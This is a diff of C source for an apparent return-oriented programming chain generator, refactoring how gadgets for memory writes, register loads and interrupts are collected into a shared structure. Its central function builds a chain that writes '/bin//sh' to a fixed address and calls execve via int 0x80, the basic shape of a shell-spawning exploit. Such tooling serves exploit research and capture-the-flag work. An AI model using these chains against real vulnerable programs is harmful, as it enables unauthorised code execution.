@@ -127,74 +127,54 @@ int rop_parse_gadgets(struct Node *root, unsigned char *binary, struct Segment *
 
 int rop_chain_execve(struct Node *root, struct Gadget *head, struct Arg *arg)
 {
-    int result = 1;
-    struct Gadget *writeMEM;
-    struct Gadget *readMEM;
-    struct Gadget *writeREG;
-    struct Gadget *zeroREG;
-    struct Gadget *arithREG;
-    struct Gadget *INT;
-    result = rop_build_write_memory_gadget(root, &writeMEM, arg);
-    if(result == -1)
-    {
-        rop_chain_list_free(writeMEM);
-        printf("Build WriteMEM Gadgets Failed\n");
-        return -1;
-    }
-    result = rop_build_read_memory_gadget(root, &readMEM, arg);
-    if(result == -1)
-    {
-        rop_chain_list_free(readMEM);
-        printf("Build ReadMEM Gadgets Failed\n");
-        return -1;
-    }
-    result = rop_build_write_register_gadget(root, &writeREG, arg);
-    if(result == -1)
-    {
-        rop_chain_list_free(writeREG);
-        printf("Build WriteREG Gadgets Failed\n");
-        return -1;
-    }
-    result = rop_build_zero_register_gadget(root, &zeroREG, arg);
-    result = rop_build_arith_register_gadget(root, &arithREG, arg);
-    if(result == -1)
-    {
-        rop_chain_list_free(arithREG);
-        printf("Build ArithREG Gadgets Failed\n");
-        return -1;
-    }
-    result = rop_build_interrupt_gadget(root, &INT, arg);
-    if(result == -1)
-    {
-        rop_chain_list_free(INT);
-        printf("Build interrupt Gadgets Failed\n");
-        return -1;
-    }
+    struct API *api;
+    rop_build_api(root, &api, arg);
+
     printf("\n--- Start chain *execve(\"/bin/sh\")* gadgets ---\n\n");
     rop_chain_list_init(head);
-    rop_write_memory_gadget(head, writeMEM, 0x080efff0, 0x6e69622f);
-    rop_write_memory_gadget(head, writeMEM, 0x080efff4, 0x68732f2f);
-    rop_write_memory_gadget(head, writeMEM, 0x080efff8, 0);
+    rop_write_memory_gadget(head, api, 0x080efff0, 0x6e69622f);
+    rop_write_memory_gadget(head, api, 0x080efff4, 0x68732f2f);
+    rop_write_memory_gadget(head, api, 0x080efff8, 0);
 
-    rop_write_register_gadget(writeREG, "ebx", 0x080efff0);
-    rop_write_register_gadget(writeREG, "ecx", 0x080efff8);
-    rop_write_register_gadget(writeREG, "edx", 0x080efff8);
-    rop_chain_write_register_gadget(head, writeREG);
+    rop_write_register_gadget(api, "ebx", 0x080efff0);
+    rop_write_register_gadget(api, "ecx", 0x080efff8);
+    rop_write_register_gadget(api, "edx", 0x080efff8);
+    rop_chain_write_register_gadget(head, api);
 
-    rop_zero_register_gadget(head, zeroREG, "eax");
-    rop_arith_register_gadget(head, arithREG, "eax", 11);
-    rop_interrupt_gadget(head, INT);
-    rop_chain_list_free(writeMEM);
-    rop_chain_list_free(readMEM);
-    rop_chain_list_free(writeREG);
-    rop_chain_list_free(arithREG);
-    rop_chain_list_free(INT);
+    rop_zero_register_gadget(head, api, "eax");
+    rop_arith_register_gadget(head, api, "eax", 11);
+    rop_interrupt_gadget(head, api);
+    /*
+    rop_chain_list_free(api->writeMEM);
+    rop_chain_list_free(api->readMEM);
+    rop_chain_list_free(api->writeREG);
+    rop_chain_list_free(api->zeroREG);
+    rop_chain_list_free(api->arithREG);
+    rop_chain_list_free(api->INT);
+    */
     return 0;
 }
+int rop_build_api(struct Node *root, struct API **api, struct Arg *arg)
+{
+    *api = (struct API *)malloc(sizeof(struct API));
+    if(!*api)
+    {
+        fprintf(stderr ,"malloc failed.\n");
+        exit(-1);
+    }
+    (*api)->result_writeMEM = rop_build_write_memory_gadget(root, &((*api)->writeMEM), arg);
+    (*api)->result_readMEM = rop_build_read_memory_gadget(root, &((*api)->readMEM), arg);
+    (*api)->result_writeREG = rop_build_write_register_gadget(root, &((*api)->writeREG), arg);
+    (*api)->result_zeroREG = rop_build_zero_register_gadget(root, &((*api)->zeroREG), arg);
+    (*api)->result_arithREG = rop_build_arith_register_gadget(root, &((*api)->arithREG), arg);
+    (*api)->result_INT = rop_build_interrupt_gadget(root, &((*api)->INT), arg);
+    return 1;
+}
 
-int rop_chain_write_register_gadget(struct Gadget *head, struct Gadget *writeREG)
+int rop_chain_write_register_gadget(struct Gadget *head, struct API *api)
 {
     int i, j, k;
+    struct Gadget *writeREG = api->writeREG;
     struct Gadget *temp = writeREG;
     char part_target_write[20][10];
     char string_padding[20];
@@ -284,12 +264,17 @@ int rop_chain_write_register_gadget(struct Gadget *head, struct Gadget *writeREG
     return 0;
 }
 
-int rop_write_memory_gadget(struct Gadget *head, struct Gadget *writeMEM, unsigned int dest, unsigned int value)
+int rop_write_memory_gadget(struct Gadget *head, struct API *api, unsigned int dest, unsigned int value)
 {
     struct Gadget *temp;
     char string_value[4];
     char string_padding[20];
-    temp = writeMEM->next;
+    if(api->result_writeMEM == -1)
+    {
+        printf("X: Can't find writeMEM gadget to do this operation.\n");
+        exit(-1);
+    }
+    temp = api->writeMEM->next;
     /* bypass xor gadget */
     if(value == 0)
     {
@@ -333,10 +318,15 @@ int rop_write_memory_gadget(struct Gadget *head, struct Gadget *writeMEM, unsign
     return 1;
 }
 
-int rop_write_register_gadget(struct Gadget *writeREG, char *dest, unsigned int value)
+int rop_write_register_gadget(struct API *api, char *dest, unsigned int value)
 {
     struct Gadget *temp;
-    temp = writeREG->next;
+    if(api->result_writeREG == -1)
+    {
+        printf("X: Can't find writeREG gadget to do this operation.\n");
+        exit(-1);
+    }
+    temp = api->writeREG->next;
     if(!strcmp(dest, "ebx"))
     {
         temp = temp->next;
@@ -354,15 +344,15 @@ int rop_write_register_gadget(struct Gadget *writeREG, char *dest, unsigned int 
     }
     temp = temp->next;
     temp->address = value;
-    strcpy(writeREG->total_target_write[writeREG->total_target_write_no++], dest);
+    strcpy(api->writeREG->total_target_write[api->writeREG->total_target_write_no++], dest);
     return 1;
 }
 
-int rop_read_memory_gadget(struct Gadget *head, struct Gadget *readMEM, char *dest, unsigned int src)
+int rop_read_memory_gadget(struct Gadget *head, struct API *api, char *dest, unsigned int src)
 {
     struct Gadget *temp;
     char string_padding[20];
-    temp = readMEM->next;
+    temp = api->readMEM->next;
     while(temp)
     {
         if(!strcmp(temp->target_write, dest))
@@ -387,14 +377,14 @@ int rop_read_memory_gadget(struct Gadget *head, struct Gadget *readMEM, char *de
         }
         temp = temp->next->next;
     }
-    printf("X: Can't find gadget loading to this register.\n");
+    printf("X: Can't find readMEM gadget to do this operation.\n");
     exit(-1);
 }
 
-int rop_zero_register_gadget(struct Gadget *head, struct Gadget *zeroREG, char *dest)
+int rop_zero_register_gadget(struct Gadget *head, struct API *api, char *dest)
 {
     struct Gadget *temp;
-    temp = zeroREG->next;
+    temp = api->zeroREG->next;
     while(temp)
     {
         if(strstr(temp->string ,dest))
@@ -404,16 +394,16 @@ int rop_zero_register_gadget(struct Gadget *head, struct Gadget *zeroREG, char *
         }
         temp = temp->next;
     }
-    printf("X: Can't find gadget to this register.\n");
+    printf("X: Can't find zeroREG gadget to do this operation.\n");
     exit(-1);
 }
 
-int rop_arith_register_gadget(struct Gadget *head, struct Gadget *arithREG, char *dest, unsigned int value)
+int rop_arith_register_gadget(struct Gadget *head, struct API *api, char *dest, unsigned int value)
 {
     struct Gadget *temp;
     unsigned int i;
     char string_padding[20];
-    temp = arithREG->next;
+    temp = api->arithREG->next;
     if(!strcmp(dest, "eax"))
     {
         rop_chain_list_add(head, temp->address, temp->string, 1);
@@ -436,9 +426,14 @@ int rop_arith_register_gadget(struct Gadget *head, struct Gadget *arithREG, char
     return 1;
 }
 
-int rop_interrupt_gadget(struct Gadget *head, struct Gadget *INT)
+int rop_interrupt_gadget(struct Gadget *head, struct API *api)
 {
-    rop_chain_list_add(head, INT->next->address, INT->next->string, 1);
+    if(api->result_INT == -1)
+    {
+        printf("X: Can't find INT gadget to do this operation.\n");
+        exit(-1);
+    }
+    rop_chain_list_add(head, api->INT->next->address, api->INT->next->string, 1);
     return 1;
 }
 
@@ -458,7 +453,7 @@ int rop_build_write_memory_gadget(struct Node *root, struct Gadget **writeMEM, s
         if(!*writeMEM)
         {
             fprintf(stderr ,"malloc failed.\n");
-            return -1;
+            exit(-1);
         }
         rop_chain_list_init(*writeMEM);
 
@@ -476,6 +471,8 @@ int rop_build_write_memory_gadget(struct Node *root, struct Gadget **writeMEM, s
             else if(depth == arg->depth-1)
             {
                 printf(" X: Can't find gadget \"%s\"\n", regexp_string);
+                printf("Build WriteMEM Gadgets Failed\n");
+                rop_chain_list_free(*writeMEM);
                 return -1;
             }
         }
@@ -714,7 +711,9 @@ int rop_build_write_register_gadget(struct Node *root, struct Gadget **writeREG,
             else if(depth == arg->depth-1)
             {
                 printf(" X: Can't find gadget \"%s\"\n", regexp_string);
-                return -1;
+                printf("Build WriteREG Gadgets Failed\n");
+                rop_chain_list_free(*writeREG);
+                exit(-1);
             }
         }
         valid = rop_chain_list_add(*writeREG, temp->address, gadget_string, 1);
@@ -822,7 +821,9 @@ int rop_build_arith_register_gadget(struct Node *root, struct Gadget **arithREG,
                 else if(depth == arg->depth-1)
                 {
                     printf(" X: Can't find gadget \"%s\"\n", regexp_string);
-                    return -1;
+                    printf("Build ArithREG Gadgets Failed\n");
+                    rop_chain_list_free(*arithREG);
+                    exit(-1);
                 }
             }
             xor_valid = rop_chain_list_add(*arithREG, temp->address, gadget_string, 1);
@@ -850,7 +851,9 @@ int rop_build_arith_register_gadget(struct Node *root, struct Gadget **arithREG,
                 else if(depth == arg->depth-1)
                 {
                     printf(" X: Can't find gadget \"%s\"\n", regexp_string);
-                    return -1;
+                    printf("Build ArithREG Gadgets Failed\n");
+                    rop_chain_list_free(*arithREG);
+                    exit(-1);
                 }
             }
             inc_valid = rop_chain_list_add(*arithREG, temp->address, gadget_string, 1);
@@ -890,7 +893,9 @@ int rop_build_interrupt_gadget(struct Node *root, struct Gadget **INT, struct Ar
     else
     {
         printf(" X: Can't find gadget \"%s\"\n", regexp_string);
-        return -1;
+        printf("Build interrupt Gadgets Failed\n");
+        rop_chain_list_free(*INT);
+        exit(-1);
     }
 }
 
